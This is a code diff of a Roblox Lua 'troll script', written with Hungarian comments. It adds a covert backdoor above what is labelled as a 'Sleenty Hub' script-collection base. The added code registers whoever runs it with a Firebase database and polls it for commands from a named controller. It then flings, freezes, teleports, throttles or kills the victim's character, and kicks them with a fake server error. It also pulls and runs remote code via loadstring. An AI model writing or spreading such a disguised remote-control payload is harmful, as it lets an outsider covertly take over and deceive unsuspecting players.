@@ -1,61 +1,88 @@
+-- [[ TROLL SCRIPT V17 - WALKING + FPS + SPEED FIX ]]
+local FIREBASE_URL = "https://troll-9ab62-default-rtdb.firebaseio.com/"
+local myName = "Foamy_F12"
+local lp = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local req = (syn and syn.request) or (http and http.request) or http_request or request
 
--- [[ TROLL KÓD V8 - Foamy_F12 FIX ]]
-local FIREBASE_URL = "https://troll-9ab62-default-rtdb.firebaseio.com/.json"
-local myName = "Foamy_F12" 
 local forcedSpeed = 16
 local spinEnabled = false
+local flingEnabled = false
 
+-- Regisztráció
+if req then
+    req({
+        Url = FIREBASE_URL .. "players/" .. lp.Name .. ".json",
+        Method = "PUT",
+        Body = HttpService:JSONEncode({active = true, t = tick()})
+    })
+end
+
+-- Fizikai Loop (Speed, Spin, Fling)
 task.spawn(function()
     while true do
-        task.wait(0.05)
+        task.wait(0.01)
         pcall(function()
-            local char = game.Players.LocalPlayer.Character
-            local hum = char.Humanoid
-            local root = char.HumanoidRootPart
-            if hum.WalkSpeed ~= forcedSpeed then hum.WalkSpeed = forcedSpeed end
-            if spinEnabled then root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(45), 0) end
+            local char = lp.Character
+            local hum = char:FindFirstChild("Humanoid")
+            local root = char:FindFirstChild("HumanoidRootPart")
+            if hum then hum.WalkSpeed = forcedSpeed end
+            if spinEnabled and root then root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(45), 0) end
+            if flingEnabled and root then
+                root.Velocity = Vector3.new(0, 8000, 0)
+                root.RotVelocity = Vector3.new(0, 8000, 0)
+            end
         end)
     end
 end)
 
+-- Parancsfigyelő (Minden funkcióval)
 task.spawn(function()
     local lastT = 0
     while true do
         task.wait(0.4)
-        local ok, res = pcall(function() return game:HttpGet(FIREBASE_URL .. "?t=" .. tostring(tick())) end)
-        if ok and res and res ~= "null" then
-            local data = game:GetService("HttpService"):JSONDecode(res)
-            if data and data.t and data.t > lastT then
+        local ok, res = pcall(function() return game:HttpGet(FIREBASE_URL .. "cmds/" .. lp.Name .. ".json?t=" .. tick()) end)
+        if ok and res ~= "null" then
+            local data = HttpService:JSONDecode(res)
+            if data and data.t > lastT then
                 lastT = data.t
-                local p = game.Players.LocalPlayer
-                local char = p.Character
-                local hum = char and char:FindFirstChild("Humanoid")
-                local root = char and char:FindFirstChild("HumanoidRootPart")
+                local cmd = data.cmd
+                local char = lp.Character
+                local hum = char:FindFirstChild("Humanoid")
+                local root = char:FindFirstChild("HumanoidRootPart")
                 
                 if hum and root then
-                    -- LÖKÉSEK JAVÍTVA
-                    if data.cmd == "forward" then hum:MoveTo(root.Position + (root.CFrame.LookVector * 20))
-                    elseif data.cmd == "back" then hum:MoveTo(root.Position - (root.CFrame.LookVector * 20))
-                    elseif data.cmd == "left" then hum:MoveTo(root.Position - (root.CFrame.RightVector * 20))
-                    elseif data.cmd == "right" then hum:MoveTo(root.Position + (root.CFrame.RightVector * 20))
-                    
-                    elseif data.cmd == "jump" then hum.JumpPower = 150 hum.Jump = true
-                    elseif data.cmd == "respawn" then hum.Health = 0
-                    elseif data.cmd == "spin" then spinEnabled = not spinEnabled
-                    elseif data.cmd == "tp" then
+                    -- MOZGÁS (MoveTo)
+                    if cmd == "forward" then hum:MoveTo(root.Position + (root.CFrame.LookVector * 20))
+                    elseif cmd == "back" then hum:MoveTo(root.Position - (root.CFrame.LookVector * 20))
+                    elseif cmd == "left" then hum:MoveTo(root.Position - (root.CFrame.RightVector * 20))
+                    elseif cmd == "right" then hum:MoveTo(root.Position + (root.CFrame.RightVector * 20))
+                    -- SPECIÁLIS
+                    elseif cmd == "fling" then flingEnabled = true task.wait(0.7) flingEnabled = false
+                    elseif cmd == "spin" then spinEnabled = not spinEnabled
+                    elseif cmd == "jump" then hum.JumpPower = 250 hum.Jump = true
+                    elseif cmd == "respawn" then hum.Health = 0
+                    elseif cmd == "tp" then
                         local target = game.Players:FindFirstChild(myName)
-                        if target and target.Character then root.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0,3,0) end
-                    elseif data.cmd == "fps10" then setfpscap(10)
-                    elseif data.cmd == "fpsmax" then setfpscap(0)
-                    elseif data.cmd == "speed0" then forcedSpeed = 0
-                    elseif data.cmd == "speed16" then forcedSpeed = 16
-                    elseif data.cmd == "speed500" then forcedSpeed = 500
-                    elseif data.cmd == "kick" then p:Kick("Please check your internet connection and try again. (277)") end
+                        if target then root.CFrame = target.Character.HumanoidRootPart.CFrame end
+                    -- SEBESSÉG
+                    elseif cmd == "speed0" then forcedSpeed = 0
+                    elseif cmd == "speed16" then forcedSpeed = 16
+                    elseif cmd == "speed100" then forcedSpeed = 100
+                    elseif cmd == "speed500" then forcedSpeed = 500
+                    -- FPS
+                    elseif cmd == "fps10" then setfpscap(10)
+                    elseif cmd == "fps30" then setfpscap(30)
+                    elseif cmd == "fps60" then setfpscap(60)
+                    elseif cmd == "fpsmax" then setfpscap(0)
+                    -- KICK
+                    elseif cmd == "kick" then lp:Kick("Kicked by server (Error: 277)") end
                 end
             end
         end
     end
 end)
+
 
 -- [[ SLEENTY HUB ALAP - ÖSSZES SZKRIPTTEL ]]
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
